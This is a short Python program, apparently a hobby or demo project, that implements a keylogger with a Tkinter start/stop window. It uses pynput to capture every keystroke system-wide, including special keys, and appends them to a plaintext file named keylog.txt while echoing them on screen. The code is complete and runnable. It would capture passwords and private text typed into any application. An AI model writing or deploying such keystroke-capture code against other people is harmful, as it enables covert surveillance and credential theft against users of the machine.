from pynput import keyboard
import tkinter as tk
import os

log_file = "keylog.txt"
keylogger_active = False

def write_to_file(key):
    try:
        key_data = str(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            key_data = ' '
        elif key == keyboard.Key.enter:
            key_data = '\n'
        elif key == keyboard.Key.backspace:
            key_data = " [BACKSPACE] "
        elif key == keyboard.Key.tab:
            key_data = " [TAB] "
        elif key == keyboard.Key.delete:
            key_data = " [DELETE] "
        else:
            key_data = f" [{key}] "
    
    print(f"Key pressed: {key_data}")

    # Write to log file
    with open(log_file, "a") as file:
        file.write(key_data)

    # Update the Textbox
    text_box.insert(tk.END, key_data)
    text_box.see(tk.END)

# Function to start keylogger
def start_keylogger():
    global keylogger_active, listener
    if not keylogger_active:
        keylogger_active = True
        start_button.config(state=tk.DISABLED)  # Disable start button
        stop_button.config(state=tk.NORMAL)     # Enable stop button
        with open(log_file, "w") as f:
            f.write("Keylogger started...\n")
        listener = keyboard.Listener(on_press=write_to_file)
        listener.start()
        print("Keylogger started")

# Function to stop keylogger
def stop_keylogger():
    global keylogger_active, listener
    if keylogger_active:
        keylogger_active = False
        stop_button.config(state=tk.DISABLED)   # Disable stop button
        start_button.config(state=tk.NORMAL)    # Enable start button
        listener.stop()
        print("Keylogger stopped")

# Function to create the GUI
def create_gui():
    global text_box, start_button, stop_button  # Declare buttons as global variables

    window = tk.Tk()
    window.title("Keylogger")

    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=10)

    stop_button = tk.Button(window, text="Stop Keylogger", state=tk.DISABLED, command=stop_keylogger)
    stop_button.pack(pady=10)

    # Create a Textbox to display pressed keys
    text_box = tk.Text(window, height=15, width=50)
    text_box.pack(pady=10)

    # Run the window
    window.mainloop()

# Run the GUI
create_gui()
